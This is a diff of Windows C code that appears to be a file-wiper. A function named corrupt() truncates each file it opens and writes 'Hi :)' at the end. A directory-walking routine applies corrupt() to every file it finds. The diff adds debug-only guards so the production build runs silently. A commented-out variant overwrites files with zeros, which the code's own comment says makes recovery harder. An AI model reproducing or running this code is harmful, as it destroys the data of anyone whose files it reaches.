@@ -1,12 +1,20 @@
-#include "includes.h"
+#include <Windows.h>
+#include <stdio.h>
+#include <tchar.h>
+#include <wchar.h>
+#include <io.h>
 
 u_long FileSizeByName(wchar_t *sFileName)
 {
 	FILE *fp = NULL;
+#ifdef _DEBUG
 	wprintf_s(L"sFileName is: %s\n", sFileName);
+#endif 
 	if(_wfopen_s(&fp, sFileName, L"r")!=0)
 	{
+#ifdef _DEBUG
 		wprintf_s(L"Error opening file for READING: %s\n", sFileName);
+#endif
 		return 1;
 	}
 	HANDLE hFile = INVALID_HANDLE_VALUE;
@@ -14,31 +22,46 @@ u_long FileSizeByName(wchar_t *sFileName)
 	u_long  iFileSize = 0;
 	iFileSize = GetFileSize(hFile, NULL);
 	fclose(fp);
-	#ifndef DEBUG
-	//CloseHandle(hFile); // this will ALWAYS throw an exception if run under a debugger
-	#endif
+#ifndef _DEBUG
+	CloseHandle(hFile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
+#endif 
+#ifdef _DEBUG
 	wprintf_s(L"File Size: %d\r\n", iFileSize);
+#endif
 	return iFileSize;
 }
 
-bool corrupt(wchar_t *sTarget)
+int corrupt(wchar_t *sTarget)
 {
 	u_long iFileSize = FileSizeByName(sTarget);
+#ifdef _DEBUG
 	wprintf_s(L"iFileSize is : %d\n", iFileSize);
+#endif
 	FILE *fp = NULL;
 	if(_wfopen_s(&fp, sTarget, L"w+")!=0)
 	{
+#ifdef _DEBUG
 		wprintf_s(L"Error opening file for WRITING: %s\n", sTarget);
+#endif
 		return 1;
 	}
 
-	for (long i=0 ; i < (long)iFileSize ; i++)
+	/*
+	char buffer[1024 * 64] = {0};
+	fwrite(buffer, 1, sizeof(buffer), fp);
+	*/
+	fseek ( fp , iFileSize-5, SEEK_SET ); // 5 bytes for the friendly salutation :>
+	fputs("Hi :)",fp);
+
+	/* // this method will prevent the OS from creating sparse files, and will be harder to recover overwritten data. 
+	for (u_long i=0 ; i < iFileSize ; i++)
 	{
-		fseek ( fp , i, SEEK_SET );
-		fputs("\x41",fp);
+	fseek ( fp , i, SEEK_SET );
+	fputs("\x00",fp);
 	}
+	*/
 	fclose(fp);
-	return TRUE;
+	return 0;
 }
 
 int ListDirectoryContents(const wchar_t *sDir)
@@ -71,7 +94,6 @@ int ListDirectoryContents(const wchar_t *sDir)
 			} 
 			else{ 
 				wprintf_s(L"File: %s\n", sPath); 
-				double size = FindFileData.nFileSizeLow;
 				corrupt(sPath);
 			} 
 		}
